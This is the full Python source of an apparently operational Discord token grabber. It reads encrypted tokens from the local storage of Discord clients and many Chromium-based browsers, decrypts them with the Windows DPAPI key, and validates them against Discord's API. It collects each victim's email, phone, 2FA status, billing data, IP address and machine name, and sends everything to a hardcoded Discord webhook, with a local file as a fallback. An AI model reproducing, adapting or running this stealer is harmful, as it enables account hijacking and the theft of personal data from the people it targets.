from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

# ==================== الرابط الثابت ====================
FIXED_WEBHOOK = "https://discord.com/api/webhooks/1454299225289523325/l3eoMk6d6bXQWSFdB2vfSX9wpG7si0DL8YVuTUut7Zbzdzv2iJEGRMpU5tAaKFVDs14t"
# =======================================================

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    
    for platform, path in paths.items():
        if not os.path.exists(path): 
            continue
        
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: 
            continue
        
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and not file.endswith(".log"): 
                continue
            
            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError: 
                continue
        
        for i in tokens:
            if i.endswith("\\"):
                i = i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                if tok == "Error":
                    continue
            except:
                continue
            
            checker.append(tok)
            
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    
                    headers = {'Authorization': value, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers, timeout=10)
                    except:
                        continue
                    
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email'] if 'email' in res_json else "None"
                        phone = res_json['phone'] if 'phone' in res_json else "None"
                        mfa_enabled = res_json['mfa_enabled']
                        
                        has_nitro = False
                        try:
                            res_nitro = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', 
                                                    headers=headers, timeout=10)
                            nitro_data = res_nitro.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            days_left = 0
                            if has_nitro and len(nitro_data) > 0:
                                if "current_period_end" in nitro_data[0]:
                                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                    days_left = abs((d2 - d1).days)
                        except:
                            days_left = 0
                            has_nitro = False
                        
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :key: __Token__\n\t`{value}`\n
*Captured at {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}*"""
                        
                        payload = json.dumps({
                            'content': embed, 
                            'username': '🔐 Token Logger', 
                            'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'
                        })
                        
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            }
                            req = Request(FIXED_WEBHOOK, data=payload.encode(), headers=headers2)  # ⬅️ هنا الرابط الثابت
                            urlopen(req)
                            print(f"[+] Sent data for: {user_name}")
                        except Exception as e:
                            print(f"[-] Failed to send: {str(e)[:50]}")
                            # حفظ محلي في حالة فشل الإرسال
                            with open("local_tokens.txt", "a", encoding="utf-8") as f:
                                f.write(f"{user_name} | {email} | {value}\n")

if __name__ == '__main__':
    print("="*50)
    print("Discord Token Grabber - Fixed Webhook Version")
    print(f"Webhook: {FIXED_WEBHOOK[:50]}...")
    print("="*50)
    get_token()
    print("[+] Scan completed!")